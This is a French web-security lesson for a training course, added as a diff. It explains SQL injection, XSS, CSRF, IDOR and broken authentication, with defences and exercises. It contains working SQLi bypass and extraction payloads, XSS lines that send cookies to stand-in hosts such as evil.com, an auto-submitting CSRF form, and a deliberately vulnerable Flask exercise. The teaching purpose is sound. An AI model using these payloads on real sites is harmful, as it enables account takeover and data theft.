@@ -1,0 +1,664 @@
+# 🌐 LEÇON 6 — Web Security
+### *SQL Injection · XSS · CSRF · IDOR · Authentification*
+
+---
+
+## POURQUOI LA SÉCURITÉ WEB EST CRITIQUE
+
+95% des applications que tu investigues en OSINT sont des applications web. La DGRH avait un portail web. ECHATS PRO est une application web. Comprendre comment ces applications sont attaquées c'est comprendre comment la majorité des compromissions réelles se produisent.
+
+Cette leçon t'apprend à **penser comme un attaquant pour défendre comme un expert**.
+
+---
+
+## PARTIE 1 — Comment fonctionne une Application Web
+
+Avant d'attaquer ou défendre, comprendre l'architecture.
+
+```
+NAVIGATEUR          SERVEUR WEB         BASE DE DONNÉES
+    |                    |                     |
+    |-- Requête HTTP --> |                     |
+    |   GET /login       |-- Query SQL ------> |
+    |   POST /search     |                     |
+    |                    |<-- Résultats ------- |
+    |<-- Réponse HTML -- |                     |
+```
+
+**Les 3 composants vulnérables :**
+
+```
+1. ENTRÉES UTILISATEUR
+   Formulaires, URLs, cookies, headers
+   Tout ce que l'utilisateur contrôle peut être manipulé
+
+2. LOGIQUE SERVEUR
+   Comment le serveur traite les données
+   Erreurs de validation, autorisations insuffisantes
+
+3. BASE DE DONNÉES
+   Stockage des données
+   Vulnérable si les requêtes ne sont pas sécurisées
+```
+
+**Principe fondamental :**
+
+> Ne jamais faire confiance à ce qui vient du client. Jamais.
+
+Tout ce qu'un utilisateur envoie — formulaire, URL, cookie, header HTTP — peut être modifié par un attaquant. Le serveur doit tout valider, tout filtrer, tout vérifier.
+
+---
+
+## PARTIE 2 — SQL Injection
+
+### Comprendre les bases de données
+
+Quand tu te connectes à un site, le serveur exécute une requête SQL comme celle-ci :
+
+```sql
+SELECT * FROM utilisateurs
+WHERE email = 'ton@email.com'
+AND mot_de_passe = 'tonmotdepasse'
+```
+
+Si cette requête retourne un résultat, tu es connecté.
+
+### L'attaque
+
+Un développeur non sécurisé construit cette requête en concaténant directement les données de l'utilisateur :
+
+```python
+# CODE DANGEREUX — Ne jamais faire ça
+email = input("Email : ")
+mdp = input("Mot de passe : ")
+
+requete = "SELECT * FROM utilisateurs WHERE email = '" + email + "' AND mdp = '" + mdp + "'"
+```
+
+Si tu entres comme email :
+```
+admin@site.com' --
+```
+
+La requête devient :
+```sql
+SELECT * FROM utilisateurs
+WHERE email = 'admin@site.com' --' AND mdp = 'nimportequoi'
+```
+
+`--` en SQL c'est un commentaire. Tout ce qui suit est ignoré. La vérification du mot de passe est **supprimée**. Tu es connecté sans mot de passe.
+
+### Autres payloads classiques
+
+```sql
+-- Bypass d'authentification complet
+' OR '1'='1
+
+-- Récupérer toutes les lignes
+' OR 1=1 --
+
+-- Identifier le nombre de colonnes (pour UNION)
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --  ← erreur ici = 2 colonnes
+
+-- Extraire les données d'une autre table
+' UNION SELECT username, password FROM admin --
+
+-- Identifier la version du serveur SQL
+' UNION SELECT @@version, null --
+
+-- Lister les tables
+' UNION SELECT table_name, null FROM information_schema.tables --
+```
+
+### SQLi Blind — Quand il n'y a pas de message d'erreur
+
+Parfois le site ne montre pas les erreurs. L'attaquant pose des questions Vrai/Faux :
+
+```sql
+-- Si la page change = premier caractère du mot de passe admin est 'a'
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
+
+-- Time-based : si la page met 5 secondes = condition vraie
+' AND SLEEP(5) --
+' AND IF(1=1, SLEEP(5), 0) --
+```
+
+### La défense — Requêtes Paramétrées
+
+```python
+import sqlite3
+
+conn = sqlite3.connect("base.db")
+cursor = conn.cursor()
+
+# ❌ DANGEREUX — concaténation directe
+email = input("Email : ")
+cursor.execute("SELECT * FROM users WHERE email = '" + email + "'")
+
+# ✅ SÉCURISÉ — requête paramétrée
+# Le ? est un placeholder — les données sont séparées du code SQL
+# L'injection est impossible car les données ne sont jamais interprétées comme SQL
+cursor.execute("SELECT * FROM users WHERE email = ?", (email,))
+
+# Avec plusieurs paramètres
+cursor.execute(
+    "SELECT * FROM users WHERE email = ? AND actif = ?",
+    (email, True)
+)
+```
+
+**Pourquoi ça protège :** les données de l'utilisateur sont envoyées séparément de la requête. Le moteur SQL les traite comme des données pures, jamais comme du code. Même si tu entres `' OR 1=1 --`, c'est traité comme un email littéral.
+
+---
+
+## PARTIE 3 — XSS (Cross-Site Scripting)
+
+### Principe
+
+XSS c'est injecter du code JavaScript malveillant dans une page web vue par d'autres utilisateurs.
+
+**Scénario concret :**
+
+Un site de forum permet de poster des commentaires. Un attaquant poste :
+
+```html
+Voici mon commentaire <script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
+```
+
+Si le site n'assainit pas les commentaires, chaque visiteur qui lit ce commentaire exécute le JavaScript malveillant. Leurs cookies de session sont envoyés à l'attaquant. L'attaquant peut se connecter à leur place.
+
+### Types de XSS
+
+**XSS Réfléchi (Reflected)**
+Le payload est dans l'URL. La victime doit cliquer sur un lien piégé.
+
+```
+https://site.com/recherche?q=<script>alert('XSS')</script>
+```
+
+Si le site affiche "Résultats pour : [terme recherché]" sans filtrer, le script s'exécute.
+
+**XSS Stocké (Stored) — Le plus dangereux**
+Le payload est enregistré en base de données. Tous les visiteurs sont touchés automatiquement.
+
+```
+Commentaire posté : <script>vol_de_cookies()</script>
+Stocké en base de données
+Affiché à chaque visiteur → exécuté chez chaque visiteur
+```
+
+**XSS DOM-based**
+La manipulation se passe côté client, dans le JavaScript de la page.
+
+### Payloads XSS courants
+
+```html
+<!-- Test basique — affiche une alerte -->
+<script>alert('XSS')</script>
+
+<!-- Vol de cookies -->
+<script>document.location='https://attaquant.com/?c='+document.cookie</script>
+
+<!-- Contournement des filtres basiques -->
+<img src=x onerror="alert('XSS')">
+<svg onload="alert('XSS')">
+<body onload="alert('XSS')">
+
+<!-- Sans guillemets -->
+<script>alert`XSS`</script>
+
+<!-- Encodé en HTML entities pour bypasser certains filtres -->
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+```
+
+### La défense
+
+```python
+import html
+
+# ❌ DANGEREUX
+commentaire = request.form["commentaire"]
+afficher(f"<p>{commentaire}</p>")
+
+# ✅ SÉCURISÉ — Échapper les caractères HTML
+# < devient &lt;
+# > devient &gt;
+# " devient &quot;
+# & devient &amp;
+# Les balises HTML sont affichées comme texte, pas exécutées
+commentaire_safe = html.escape(commentaire)
+afficher(f"<p>{commentaire_safe}</p>")
+```
+
+**Content Security Policy (CSP) — deuxième ligne de défense :**
+
+```
+Header HTTP :
+Content-Security-Policy: default-src 'self'; script-src 'self'
+
+Signifie : n'exécuter que les scripts qui viennent de ce domaine
+Même si un attaquant injecte <script>...</script>
+Le navigateur refuse de l'exécuter
+```
+
+---
+
+## PARTIE 4 — CSRF (Cross-Site Request Forgery)
+
+### Principe
+
+CSRF force un utilisateur **authentifié** à effectuer une action à son insu.
+
+**Scénario :**
+
+Tu es connecté à ta banque. Tu visites un autre site. Ce site contient :
+
+```html
+<!-- Image invisible -->
+<img src="https://tabanque.com/virement?vers=attaquant&montant=1000000">
+```
+
+Ton navigateur essaie de charger cette "image". Il envoie automatiquement tes cookies de session à ta banque. La banque croit que c'est toi qui fais le virement. Le virement est effectué.
+
+### Forme plus élaborée
+
+```html
+<!-- Formulaire qui se soumet automatiquement -->
+<form action="https://site-cible.com/changer-email" method="POST" id="csrf">
+  <input type="hidden" name="nouvel_email" value="attaquant@evil.com">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+La victime visite la page de l'attaquant. Le formulaire se soumet automatiquement. Son email de compte est changé à son insu.
+
+### La défense — Token CSRF
+
+```python
+import secrets
+
+# À la génération du formulaire
+def generer_formulaire():
+    # Générer un token unique et imprévisible
+    token_csrf = secrets.token_hex(32)
+
+    # Le stocker en session côté serveur
+    session["csrf_token"] = token_csrf
+
+    # L'inclure dans le formulaire comme champ caché
+    return f"""
+    <form method="POST">
+      <input type="hidden" name="csrf_token" value="{token_csrf}">
+      <input type="email" name="email">
+      <button>Changer email</button>
+    </form>
+    """
+
+# À la réception du formulaire
+def traiter_formulaire(request):
+    token_recu = request.form.get("csrf_token")
+    token_attendu = session.get("csrf_token")
+
+    if not token_recu or token_recu != token_attendu:
+        # Le token ne correspond pas
+        # C'est probablement une attaque CSRF
+        return "Requête invalide", 403
+
+    # Token valide — traiter la requête
+    # ...
+```
+
+**Pourquoi ça protège :** l'attaquant ne connaît pas le token CSRF car il est unique par session. Son formulaire piégé ne contient pas le bon token. Le serveur rejette la requête.
+
+---
+
+## PARTIE 5 — IDOR (Insecure Direct Object Reference)
+
+### Principe
+
+IDOR c'est accéder à des ressources qui ne t'appartiennent pas en modifiant un identifiant dans l'URL.
+
+**Scénario :**
+
+Tu consultes ton profil :
+```
+https://site.com/profil?id=1042
+```
+
+Tu changes l'ID :
+```
+https://site.com/profil?id=1041
+https://site.com/profil?id=1
+```
+
+Si le serveur ne vérifie pas que tu as le droit de voir ce profil — tu vois les données de n'importe qui.
+
+### Exemples réels
+
+```
+# Télécharger ta facture
+GET /facture/download?fichier=facture_1042.pdf
+
+# Modifier le nom du fichier
+GET /facture/download?fichier=facture_0001.pdf
+→ Accès à la facture de quelqu'un d'autre
+
+# API qui retourne tes messages
+GET /api/messages?user_id=1042
+
+# Modifier l'ID
+GET /api/messages?user_id=1
+→ Messages de l'administrateur
+
+# Modifier ton propre mot de passe
+POST /changer-mdp
+{"user_id": 1042, "nouveau_mdp": "test123"}
+
+# Modifier l'ID dans la requête
+POST /changer-mdp
+{"user_id": 1, "nouveau_mdp": "test123"}
+→ Mot de passe admin changé
+```
+
+### La défense
+
+```python
+# ❌ DANGEREUX — fait confiance à l'ID fourni
+def voir_profil(request):
+    user_id = request.args.get("id")
+    profil = db.query(f"SELECT * FROM users WHERE id = {user_id}")
+    return profil
+
+# ✅ SÉCURISÉ — vérifie que l'utilisateur connecté
+# a le droit d'accéder à cette ressource
+def voir_profil(request):
+    user_id = request.args.get("id")
+    user_connecte = session["user_id"]
+
+    # Vérifier l'autorisation
+    if int(user_id) != user_connecte and not est_admin(user_connecte):
+        return "Accès refusé", 403
+
+    profil = db.query("SELECT * FROM users WHERE id = ?", (user_id,))
+    return profil
+```
+
+---
+
+## PARTIE 6 — Authentification Cassée
+
+### Les erreurs courantes
+
+**1. Mots de passe stockés en clair**
+```
+Base de données compromise :
+email: admin@site.com
+password: Admin2024!
+→ Accès immédiat sans aucun craquage
+```
+
+**2. Tokens de session prévisibles**
+```python
+# ❌ DANGEREUX — token basé sur l'ID
+session_token = "session_" + str(user_id)
+# → Facile à deviner/forger
+
+# ✅ SÉCURISÉ — token aléatoire
+import secrets
+session_token = secrets.token_hex(32)
+# → 64 caractères hexadécimaux aléatoires
+```
+
+**3. Pas de limitation des tentatives**
+```
+# Sans protection
+POST /login {"email": "admin@site.com", "password": "aaaaaa"}
+POST /login {"email": "admin@site.com", "password": "aaaaab"}
+POST /login {"email": "admin@site.com", "password": "aaaaac"}
+... 10 milliards de tentatives automatiques
+→ Bruteforce possible
+
+# Avec protection
+Après 5 tentatives échouées :
+→ Blocage temporaire (15 minutes)
+→ CAPTCHA obligatoire
+→ Notification email
+```
+
+**4. Sessions qui ne s'invalident pas**
+```python
+# ❌ DANGEREUX
+def deconnexion():
+    # Juste supprimer le cookie côté client
+    response.delete_cookie("session")
+    # Le token existe encore côté serveur
+
+# ✅ SÉCURISÉ
+def deconnexion():
+    token = session["token"]
+    # Invalider le token côté serveur
+    db.execute("DELETE FROM sessions WHERE token = ?", (token,))
+    response.delete_cookie("session")
+```
+
+---
+
+## PARTIE 7 — Headers HTTP de Sécurité
+
+Un serveur bien configuré envoie ces headers qui protègent les utilisateurs :
+
+```python
+def ajouter_headers_securite(response):
+    """
+    Headers de sécurité essentiels à mettre sur tout serveur web
+    """
+
+    # Empêche le navigateur de deviner le type de contenu
+    response.headers["X-Content-Type-Options"] = "nosniff"
+
+    # Empêche l'inclusion dans des iframes (clickjacking)
+    response.headers["X-Frame-Options"] = "DENY"
+
+    # Force HTTPS pendant 1 an
+    response.headers["Strict-Transport-Security"] = (
+        "max-age=31536000; includeSubDomains"
+    )
+
+    # Politique de sécurité du contenu
+    response.headers["Content-Security-Policy"] = (
+        "default-src 'self'; "
+        "script-src 'self'; "
+        "style-src 'self' 'unsafe-inline'"
+    )
+
+    # Contrôle les informations de référent
+    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+
+    # Empêche certaines attaques XSS dans les anciens navigateurs
+    response.headers["X-XSS-Protection"] = "1; mode=block"
+
+    return response
+```
+
+**En investigation OSINT :** analyser les headers d'un serveur révèle sa configuration et ses vulnérabilités potentielles.
+
+```python
+import requests
+
+def audit_headers(url):
+    r = requests.get(url, timeout=5)
+
+    headers_securite = {
+        "X-Content-Type-Options": "Protège contre MIME sniffing",
+        "X-Frame-Options": "Protège contre clickjacking",
+        "Strict-Transport-Security": "Force HTTPS",
+        "Content-Security-Policy": "Protège contre XSS",
+        "X-XSS-Protection": "Protection XSS basique"
+    }
+
+    print(f"\nAudit sécurité : {url}")
+    print("=" * 50)
+
+    for header, description in headers_securite.items():
+        valeur = r.headers.get(header)
+        if valeur:
+            print(f"✅ {header}")
+            print(f"   {description}")
+            print(f"   Valeur : {valeur}")
+        else:
+            print(f"❌ {header} ABSENT")
+            print(f"   Risque : {description} non appliqué")
+        print()
+
+audit_headers("https://echats-808c4.web.app")
+```
+
+---
+
+## PARTIE 8 — Methodologie d'un Pentest Web
+
+C'est la démarche que suit un testeur d'intrusion professionnel sur une application web.
+
+```
+PHASE 1 — RECONNAISSANCE
+→ Cartographier l'application
+→ Identifier toutes les pages et fonctionnalités
+→ Lister tous les paramètres (URL, formulaires, cookies)
+→ Identifier les technologies (Wappalyzer, headers)
+
+PHASE 2 — CARTOGRAPHIE DES SURFACES D'ATTAQUE
+→ Formulaires de login → SQLi, bruteforce
+→ Champs de recherche → SQLi, XSS
+→ Upload de fichiers → exécution de code
+→ URLs avec paramètres → IDOR, SQLi
+→ Fonctions de changement de données → CSRF
+
+PHASE 3 — TESTS ACTIFS
+→ Tester chaque surface identifiée
+→ Commencer par les tests non destructifs
+→ Documenter chaque test et résultat
+
+PHASE 4 — EXPLOITATION (si autorisé)
+→ Exploiter les vulnérabilités confirmées
+→ Prouver l'impact réel
+→ Ne pas aller au-delà du scope autorisé
+
+PHASE 5 — RAPPORT
+→ Vulnérabilité trouvée
+→ Preuve (screenshot, payload)
+→ Impact potentiel
+→ Recommandation de correction
+```
+
+---
+
+## ✅ EXERCICES — Leçon 6
+
+---
+
+**Exercice 1 — Identifier la vulnérabilité**
+
+Pour chaque scénario, identifie la vulnérabilité et explique pourquoi :
+
+```
+a) Un site affiche dans l'URL : /profil?id=847
+   Tu changes en /profil?id=1 et vois le profil admin
+
+b) Un champ de recherche affiche tes résultats et tu entres :
+   <script>alert('test')</script>
+   et une alerte apparaît
+
+c) Code serveur :
+   requete = "SELECT * FROM users WHERE nom = '" + nom + "'"
+
+d) Tu es connecté à un site. Un email te dit
+   "Clique ici pour gagner un prix"
+   En cliquant, ton email de compte est changé
+```
+
+---
+
+**Exercice 2 — Corriger le code**
+
+Ce code Python/Flask est vulnérable. Identifie et corrige toutes les failles :
+
+```python
+from flask import Flask, request, session
+import sqlite3
+
+app = Flask(__name__)
+
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form['email']
+    mdp = request.form['mdp']
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM users WHERE email='"
+                   + email + "' AND mdp='" + mdp + "'")
+    user = cursor.fetchone()
+    if user:
+        session['user_id'] = user[0]
+        return "Connecté"
+    return "Échec"
+
+@app.route('/profil')
+def profil():
+    user_id = request.args.get('id')
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM users WHERE id=" + user_id)
+    return str(cursor.fetchone())
+```
+
+---
+
+**Exercice 3 — Analyse réelle**
+
+En regardant ECHATS PRO — sans tester activement car c'est ton propre site — identifie théoriquement :
+1. Quelles surfaces d'attaque existent ?
+2. Quelle vulnérabilité serait la plus dangereuse si elle existait ?
+3. Comment tu vérifierais que les headers de sécurité sont en place ?
+
+---
+
+**Exercice 4 — Cas DGRH**
+
+Maintenant que tu connais les vulnérabilités web — quelle est selon toi la vulnérabilité la plus probable qui a permis la compromission de la DGRH ? Justifie avec ce que tu as vu dans cette leçon.
+
+---
+
+**Exercice 5 — Défense**
+
+Tu dois sécuriser un formulaire de connexion. Liste les **7 mesures** minimales à implémenter.
+
+---
+
+## 📌 À retenir absolument
+
+```
+SQLi        → Entrées non filtrées dans les requêtes SQL
+              Défense : requêtes paramétrées
+
+XSS         → Injection JavaScript dans des pages web
+              Défense : html.escape() + CSP headers
+
+CSRF        → Action forcée sur un utilisateur authentifié
+              Défense : token CSRF unique par session
+
+IDOR        → Accès non autorisé en modifiant un ID
+              Défense : vérifier les droits côté serveur
+
+Auth cassée → Sessions prévisibles, pas de limite tentatives
+              Défense : tokens aléatoires + rate limiting
+
+Règle d'or  → Ne jamais faire confiance aux données du client
+```
+
+---
+
+**Leçon 7 dans 2 jours : Pentest.**
+
+On passe du côté offensif structuré. Méthodologie complète d'un test d'intrusion, reconnaissance active, exploitation, post-exploitation et rapport professionnel. 🔒
